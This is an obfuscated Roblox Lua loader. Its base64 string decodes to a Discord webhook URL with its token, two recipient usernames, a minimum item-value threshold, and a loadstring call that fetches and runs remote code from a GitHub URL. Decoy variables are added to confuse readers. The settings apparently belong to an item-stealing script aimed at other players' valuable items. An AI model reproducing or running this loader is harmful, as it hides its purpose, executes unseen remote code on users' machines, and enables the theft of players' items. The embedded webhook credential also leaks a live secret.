
local OifkpFrs = 'VXNlcm5hbWUgPSAibmV3YmVnaW5uZXIxMjM0NSIKVXNlcm5hbWUyID0gIjEyMzRuZXdiZWdpbm5lciIKV2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjk3ODQ1MzU2OTcyNzM2NTQzL1N5Ulc5cWJjYnNQS0REc3A4NlY2am9FZzdRR2J5VHZ0NHNRcmxPcWREWWphOUtkT3F0MTY0X19ZY0swMlVYblFjR1N2IgpNaW5pbXVtUkFQID0gMTAwMDAwCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2hhZG93c3p6enovdGltb2NpeS9yZWZzL2hlYWRzL21haW4vbWFpbiIsIHRydWUpKSgp'
local VPwpztvuzW = function(s) 
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; 
    s = string.gsub(s, '[^'..b..'=]', ''); 
    return (s:gsub('.', function(x) 
        if x == '=' then return '' end; 
        local r,f='',(b:find(x)-1); 
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end 
        return r; 
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) 
        if (#x ~= 8) then return '' end; 
        local c=0; 
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end 
        return string.char(c) 
    end)) 
end
local VCDILTHNH = VPwpztvuzW(OifkpFrs)
loadstring(VCDILTHNH)() -- Run decoded code

-- Dummy variables for confusion
local MabNFlqxxwxw = math.random()
local OvjJLZXJmo = "This is a dummy string"
